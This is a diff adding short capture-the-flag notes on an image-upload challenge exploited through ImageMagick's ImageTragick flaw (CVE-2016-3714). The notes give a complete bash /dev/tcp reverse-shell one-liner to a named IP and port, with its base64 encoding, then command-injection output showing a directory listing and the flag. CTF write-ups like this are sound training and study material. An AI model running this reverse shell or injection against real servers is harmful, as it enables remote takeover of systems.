@@ -1,0 +1,19 @@
+Can upload .png
+	Image size is: 640 x 480
+
+ImageMagick (ImageTragick)
+	CVE-2016-3714
+
+Two Solutions
+
+# Reverse Shell
+	echo -n "/bin/bash -i >& /dev/tcp/140.113.24.143/9001 0>&1" | base64
+		L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE0MC4xMTMuMjQuMTQzLzkwMDEgMD4mMQ==
+	Upload evil.png
+
+
+# RCE
+	Upload evil2.png
+		Image size is: total 16 drwxr-xr-x 2 root root 4096 Dec 9 10:05 . drwxr-xr-x 3 root root 4096 Dec 9 10:05 .. -rw-r--r-- 1 root root 41 Dec 6 23:28 flag.txt -rw-r--r-- 1 root root 472 Dec 6 23:28 index.php 640 x 480
+	Upload evil3.png
+		Image size is: b00t2root{imagemagick_command_injection} 640 x 480
